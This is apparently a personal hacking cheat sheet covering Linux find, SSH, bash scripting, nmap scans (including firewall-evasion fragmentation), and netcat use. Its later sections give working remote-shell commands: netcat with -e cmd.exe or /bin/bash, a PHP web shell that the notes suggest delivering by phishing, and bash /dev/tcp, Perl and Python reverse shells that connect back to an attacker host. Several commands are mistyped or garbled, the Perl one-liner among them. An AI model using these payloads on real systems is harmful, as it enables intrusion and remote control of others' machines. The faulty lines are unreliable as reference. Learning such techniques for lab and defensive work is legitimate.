# Find file 2 directories deep:
find / -mexdepth -name "*.html"

# Find files with permissions, can be exploited with files that can you elevated privliges
# Example: Stickybit vulnerability
find / -type -f -perm 0664

# Find files access in the last 50 days
find / -atime 50

# Find files by size (e.g.: 50M in size)
find / -size 50M

localte command:
Will find any file that you specify, extention, etc.

# updated command
will find all files on the file system and index it

# which -a <fileName>
Find location of a app to show all the places where the app is installed.

# using the find command, how do i find a file which is:
* human-readable
* 1033 bytes in size
* not executable
find / -readable -size 1033c ! -executable

# find a file with user bandit7 and group bandit6 with a file size of 33bytes:
find / -user bandit7 -group bandit6 -size 33c

# add "2>/dev/null" to the end of the file so that it doesn't output any permission denied errors:
# Example:
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null

# Search for a word that is stored in the file data.txt and is the only line of text that occurs only once
sort data.txt | uniq -u

# Find text stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.
strings data.txt | grep '==='


=====================
SSH
=====================
ssh -C <user>@<server> "<commandToExecute>"
-C => Compress packets (Nice to hide some traffic)

# Local Port forwarding:
ssh -L 2222:google.com:80 <destinationServer>
-L 2222:google.com => Local port 2222:<serverToConnectTo> <targetServerToTunnelVia>

# SCP Copy from remote server
scp -T <user>@<server>:"c:\Windows\test.txt" <filePath>
-T => Translate the "\" from the windwos server

=====================
FILES
=====================
# Check what type of file a file is.
# Example:
file /etc/init.d/apache2
/etc/init.d/apache2: POSIX shell script, ASCII text executable


=====================
SERVICES
=====================
#See what services can run, check the /etc/init.d directory
ls /etc/init.d

update-rc.s <serviceName> <enable|disable|start|stop>


++++++++++++++++++++++++++++++++++++
++++++++++ BASH SCRIPTING ++++++++++
++++++++++++++++++++++++++++++++++++

While Loop:
-----------

n=1
while [ $n -le 5 ] 
# -le => length
do
  echo "Testing $n times!"
  n=$(( n+1 ))
done

Example output:
Testing 1 times!
Testing 2 times!
Testing 3 times!
Testing 4 times!
Testing 5 times!


For Loop:
-----------
for (( counter =5; counter>0; counter--))
# counter variable 1 (counter = 5 is the max value
# counter variable 2 (counter > 0 is the min value
# counter variable 3 (counter-- subtracts a value
do
echo -n "$counter"
done
printf "\n"

Example output:
54321


User Input:
------------
#!/bin/bash
echo "Enter Name:"
read name
echo "Welcome "$name" to Cyber World"

IF statements:
--------------
#!/bin/bash
echo "Enter Username: "
read username
echo "Enter Password: "
read password
if [[( $username == "admin" && $password == "secret" ) ]];
then
	echo "Valid user"
else
	echo "Invalid user"
fi


Reading arguments:
------------------
#!/bin/bash
echo "Total arguments: $#"
# Read the number of arguments passed
echo "1st arg =$1"
echo "2nd Argument = $2"

Example output:
./test.sh training script
Total arguments: 2
1st arg =training
2nd Argument = script

Using other tools in bash script:
---------------------------------
#!/bin/bash
# Want to know if a user types any imputs
if [${#} -eq 0 ]
then
echo "You need to enter a valid SSH server"
exit 1
else
echo "The DNS beig used by the server is: "
# Now, run the command
ssh digit@$1 "cat /etc/resolve.conf" | grep nameserver
fi

Getting details from files & modifying them:
------------------------------------------
# Convert uppercase to lower case
cat first-names.txt | tr'[:upper]' '[:lower]'

# Only display the first 20 lines
cat first-names.txt | tr'[:upper]' '[:lower]' | head -n 20

# Normilise the file to a unix format:
cat first-names.txt | tr'[:upper]' '[:lower]' | head -n 20 | dos2unix

# add  prefix (www.) to the beginning words and add a ",com" at the end of each word
# !!! If it's not a unix format, the .com will appear in the front of the word, not the back.
cat first-names.txt | tr'[:upper]' '[:lower]' | head -n 20 | dos2unix | awk '$0="www."$s0".com"'

# Adding the for loop in one line (Notice the tindle single quote, not the normal single quote):
for i in `cat first-names.txt | tr'[:upper]' '[:lower]' | head -n 20 | dos2unix | awk '$0="www."$s0".com"'`; do host $1;done

# for a cleaner output, example, only putput fiels that contain "has address":
for i in `cat first-names.txt | tr'[:upper]' '[:lower]' | head -n 20 | dos2unix | awk '$0="www."$s0".com"'`; do host $1;done | awk '/has address/ { print $4 }'

--------------
--- # nmap ---
--------------
#check which ip are alive:
nmap -sP <ipAddressOrIPRange>

# pipe to another file and only print the IP's which are UP (and print the second field)
nmap -sP <ipAddressOrIPRange> -oG - | awk '/Up$/{print $2}'
example out:
10.10.10.1
10.10.10.2

# trace packages from your PC to remote PC (Almost like wireshark), will also show ports open when you close:
nmap  --packet-trace <ipAddress>


# To show versions of ports open
nmap -sV -p 21,22,80 <ipAddress>

# Speed up or down scanning, example with packet flows:
nmap  --packet-trace -T1 <ipAddress>
# -T1 => slow (stealth)
# -T5 => Fastest scan

# Identify target OS and additional info (It's noiser than normal options)
nmap -A -O <ipAddress>

# TTL to identify O/S:
Linux = 64 TTL
Windows 128 TTL

# Stealth Syn Scan (Not stealthy) will preform handshake:
nmap -sS <ipAddress>

# UDP Scans (Can have false positives because it's does not do a handshake)
nmap -sU <ipAddress>

# Preform NULL scan, send tcp flags with nothing enables
nmap -sN <ipAddress>

#X-Mas Scan (All TCP flag are on)
nmap -sX <ipAddress>


# Scan all ports
nmap -sV -p- <ipAddress>

# -f command, send small IP fragments, the firewall/IDS will not see the entire packet at once
# Can be used to try and bypass firewall restrictions
nmap -sV -f <ipAddress>



Net Cat:
==============================================
# NetCat does not have encryption, therefore packets are send in clear text and firewall can inspect the packets for any malware.
# While doing chat (below), run a packet capture:
# Capture packets:
tcpdump -x -X -i eth0 'port 4444'
# You will see the text in plain text.

# nc vs ncat:
# ncat does encryption where nc does not.

# Gather info on windows box:
nc <ipAddress> <portNumber>

Example get info from Web server:
nc 10.10.10.1 80
HTTP/1.1 200 # An HTTP header

nc 10.10.10.1 80
head / http/1.0

nc 10.10.10.1 22 # For SSH
nc 10.10.10.1 21 # For FTP

localte nc.exe


Netcat "Chat" System:
Copy NC to windows:
scp /usr/share/windows-binaries/nc.exe <username>@<ipAddress>:"C:\Users\<username>\Desktop"

Create a listner (Kali):
nc -nlvp 1234
1234 => Port number

Windows Box:
nc <ipAddressOfKali> <portNumber>

Kali:
Type text and it will display on the windows box

Transfer files via NC - This will transfer the file to any device which will connect to Kali on port 1234:
# Kali:
nc -ntvp 1234 < /path/to/file/you/want/to/send

# Windows
nc.exe <kaliIP> <portNumber> > c:\Users\<username>\Desktop

# Take control of remote server:
# Start listener:
nc -nlvp 1234

# Remote PC, start cmd.exe:
nc <KaliIP> <portNumber> -e cmd.exe
-e => Execute

# Kali:
Press enter, you will have remote control of device


Net Cat Cheat sheet:
--------------------
Source: https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1
##Netcat Commands

NOTE: - If on Ubuntu, you need the REAL nc package, to get it use:

sudo apt-get -y install netcat-traditional
sudo update-alternatives --config nc
# Select the nc.traditional option
Netcat listening on port 567/TCP:

nc -l -p 567
Connecting to that port from another machine:

nc 1.2.3.4 5676
To pipe a text file to the listener:

cat infile | nc 1.2.3.4 567 -q 10
To have the listener save a received text file:

nc -l -p 567 > textfile
To transfer a directory, first at the receiving end set up

nc -l -p 678 | tar xvfpz 
Then send the directory:

tar zcfp - /path/to/directory | nc -w 3 1.2.3.4 678
To send a message to your syslog server (the <0> means emerg):

"echo '<0>message' | nc -w 1 -u syslogger 514"
Setting up a remote shell listener:

nc -v -e '/bin/bash' -l -p 1234 -t
or
nc l p 1234 e "c:\windows\system32\cmd.exe"
Then telnet to port 1234 from elsewhere to get the shell.

Using netcat to make an HTTP request

echo -e "GET http://www.google.com HTTP/1.0nn" | nc -w 5 www.google.com 80
Making a one-page webserver; this will feed homepage.txt to all comers.

cat homepage.txt | nc -v -l -p 80


Blind & Reverse Shells:
=======================
ncat has encryption, nc does not.

# This will start WITHOUT encryption
ncat -lvvp 4444

# This will start WITH encryption
ncat -lvvp 4444 --ssl

# ncat also needs to be running on the remote host, NOT nc, as nc does not do encryption and ncat does.
# It's like using HTTP vs HTTPS
# Ensure ncat also runs on remote box

scp /usr/share/windows-binaries/ncat.exe <username>@<ipAddress>:"C:\Users\<username>\Desktop"

# Start ncat (Kali):
ncat -lvvp 4444 --ssl

# Windows
ncat.exe -v <kaliIP> <port> --ssl
# If this failes, have a look at the procol being used for SSL (Linux ncat is more updated than Windows)
# To Check the min protocol version that Kali uses:
# On Kali:
cat /etc/ssl/openssl.cnf | grep MinProtocol

Example Output:
MinProtocol = TLSv1.2

# Change it
vi /etc/ssl/openssl.cnf 

# Go to the end of the file
# Change the version to version 1
MinProtocol = TLSv1

# Now restart the ncat listener:
ncat -lvvp 4444 --ssl

# Now run again on the remote box:
ncat.exe -v <kaliIP> <port> --ssl

# Open shell (On Kali):
ncat -lvvp 4444 -e '/bin/bash -i' --ssl

#remote PC:
ncat -v <KaliIP> <port> --ssl


WEB SHELLS:
------------
# Reverse shell.
# 1.) upload php reverse shell to web server
# 2.) Start listener on C2C server
# 3.) If user click on link, reverse shell will open.

# Install WebShells:
sudo apt install webshells

# List:
ls /usr/share/webshells

#Output:
asp  aspx  cfm  jsp  perl  php

# Copy PHP webshell to root shell on local server to test:
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/rvs.php

# Modify the listening ports:
You can send the link to your target to click on (e.g.: phishing mail)
vi /var/www/html/rvs.php

# Change:
$ip = <ServerIPthatListensForConnection> # e.g.: you kali box
$port = <portToListen>

# Start listenr
nc -nlvp 1234

# Once user click on link, reverse shell of the server will open.

# BASH Reverse shell
# Reverse using bash commands:
bash -i >& /dev/tcp/<kaliIP>/<listnerPort> 0>&1

# PERL REVERSE SHELL
# Listen from the remote host
nc.exe -nlvp 1234

perl -e 'use Socket; $i="<kaliIP>"; $p=<listnerPort>; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp") ); if(connect(S, sockaddr_in($p, inet_aton($i)))) {open(STDIN. ">&S") : open (STDOUT, ">&S" ) : open (STDERR, ">&S" ) : exec ("/bin/sh -i" ) : ]: '


# PYTHON REVERSE SHELL:
# Listen from the remote host
nc.exe -nlvp 1234

python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET, socket. SOCK_STREAM);s.connect(("10.211.55.7",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]) ;'













